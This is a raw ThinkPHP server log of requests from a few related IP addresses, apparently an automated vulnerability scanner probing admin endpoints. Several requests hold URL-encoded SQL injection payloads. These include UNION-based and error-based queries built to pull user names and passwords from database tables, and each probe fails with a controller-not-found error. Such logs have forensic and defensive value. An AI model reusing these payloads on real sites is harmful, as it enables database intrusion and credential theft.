[ 2018-02-09T15:59:10+08:00 ] 211.149.153.12 /index.php?m=announcement&s=admin/notice
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000032s ]
INFO: [ app_init ] --END-- [ RunTime:0.000507s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000461s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000942s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001478s ]
ERR: 无法加载控制器:Notice

[ 2018-02-09T16:00:36+08:00 ] 211.149.153.12 /index.php?m=announcement&s=admin/notice_manager&action=modify&id=1212%20UnIon%20select%201,2,concat(user,0x7c,password),4,5,6,7,8%20from%20webscan%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: [ app_init ] --END-- [ RunTime:0.000369s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000454s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.001316s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001885s ]
ERR: 无法加载控制器:Notice_manager

[ 2018-02-09T16:00:38+08:00 ] 211.149.153.14 /index.php?m=company&s=admin/exportexcel&ordrby=user%20and%201=websec%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
INFO: [ app_init ] --END-- [ RunTime:0.000547s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000730s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.008654s ]
INFO: [ app_begin ] --END-- [ RunTime:0.009534s ]
ERR: 无法加载控制器:Exportexcel

[ 2018-02-09T16:00:39+08:00 ] 211.149.153.12 /index.php?m=news&s=admin/news&newsid=1%20and%20(SELECT%201%20from%20websec)
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: [ app_init ] --END-- [ RunTime:0.000381s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000609s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000891s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001579s ]
ERR: 无法加载控制器:News

[ 2018-02-09T16:01:53+08:00 ] 211.149.153.12 /index.php?m=company&s=admin/business_info_list
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
INFO: [ app_init ] --END-- [ RunTime:0.000557s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000792s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.002390s ]
INFO: [ app_begin ] --END-- [ RunTime:0.003458s ]
ERR: 无法加载控制器:Business_info_list

[ 2018-02-09T16:03:19+08:00 ] 211.149.153.14 /index.php?m=news&s=admin/newslist&submit=%E5%88%A0%E9%99%A4&did=999%29%20and%20%28SELECT%201%20from%20%28select%20count%28*%29,concat%28floor%28rand%280%29*2%29,%28substring%28%28select%28selEct%20concat%28user,0x7c,password%29%20from%20f10bd198561acb0197452013b7a82429%20limit%200,1%29%29,1,62%29%29%29a%20from%20information_schema.tables%20group%20by%20a%29b%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000376s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000491s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000848s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001411s ]
ERR: 无法加载控制器:Newslist

[ 2018-02-09T16:03:20+08:00 ] 211.149.153.12 /index.php?m=payment&s=admin/pickupmod
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
INFO: [ app_init ] --END-- [ RunTime:0.000461s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000475s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000941s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001497s ]
ERR: 无法加载控制器:Pickupmod

[ 2018-02-09T16:05:10+08:00 ] 211.149.153.14 /index.php?m=announcement&s=admin/notice
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000026s ]
INFO: [ app_init ] --END-- [ RunTime:0.000544s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000738s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.001350s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002224s ]
ERR: 无法加载控制器:Notice

[ 2018-02-09T16:06:29+08:00 ] 211.149.153.13 /index.php?m=announcement&s=admin/notice_manager&action=modify&id=1212%20UnIon%20select%201,2,concat(user,0x7c,password),4,5,6,7,8%20from%20webscan%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
INFO: [ app_init ] --END-- [ RunTime:0.000459s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000468s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.001293s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001838s ]
ERR: 无法加载控制器:Notice_manager

[ 2018-02-09T16:06:31+08:00 ] 211.149.153.14 /index.php?m=company&s=admin/exportexcel&ordrby=user%20and%201=websec%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: [ app_init ] --END-- [ RunTime:0.000401s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000437s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000947s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001480s ]
ERR: 无法加载控制器:Exportexcel

[ 2018-02-09T16:06:32+08:00 ] 211.149.153.12 /index.php?m=news&s=admin/news&newsid=1%20and%20(SELECT%201%20from%20websec)
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000385s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000458s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000827s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001394s ]
ERR: 无法加载控制器:News

[ 2018-02-09T16:07:40+08:00 ] 211.149.153.14 /index.php?m=company&s=admin/business_info_list
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: [ app_init ] --END-- [ RunTime:0.000349s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000489s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000898s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001464s ]
ERR: 无法加载控制器:Business_info_list

[ 2018-02-09T16:08:45+08:00 ] 211.149.153.12 /index.php?m=news&s=admin/newslist&submit=%E5%88%A0%E9%99%A4&did=999%29%20and%20%28SELECT%201%20from%20%28select%20count%28*%29,concat%28floor%28rand%280%29*2%29,%28substring%28%28select%28selEct%20concat%28user,0x7c,password%29%20from%20f10bd198561acb0197452013b7a82429%20limit%200,1%29%29,1,62%29%29%29a%20from%20information_schema.tables%20group%20by%20a%29b%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
INFO: [ app_init ] --END-- [ RunTime:0.000404s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000505s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.000865s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001466s ]
ERR: 无法加载控制器:Newslist

[ 2018-02-09T16:08:46+08:00 ] 211.149.153.12 /index.php?m=payment&s=admin/pickupmod
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
INFO: [ app_init ] --END-- [ RunTime:0.000418s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.002583s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.001271s ]
INFO: [ app_begin ] --END-- [ RunTime:0.003952s ]
ERR: 无法加载控制器:Pickupmod

[ 2018-02-09T16:22:04+08:00 ] 211.149.153.12 /index.php/admin/?case=archive&act=respond&code=alipay&trade_status=WAIT_SELLER_SEND_GOODS
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
INFO: [ app_init ] --END-- [ RunTime:0.000541s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000680s ]
INFO: Run Behavior\CheckLangBehavior [ RunTime:0.001381s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002195s ]
ERR: 无法加载控制器:Index.php

